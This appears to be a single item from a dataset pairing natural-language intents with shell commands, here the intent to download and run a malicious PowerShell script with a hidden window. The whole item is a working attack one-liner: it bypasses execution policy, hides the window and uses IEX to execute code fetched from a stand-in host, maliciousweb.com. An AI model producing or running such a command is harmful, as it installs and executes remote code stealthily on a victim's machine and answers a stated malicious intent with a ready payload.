# Natural language intent:
# Download and execute a malicious PowerShell script from a remote server with a hidden window.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://maliciousweb.com')"
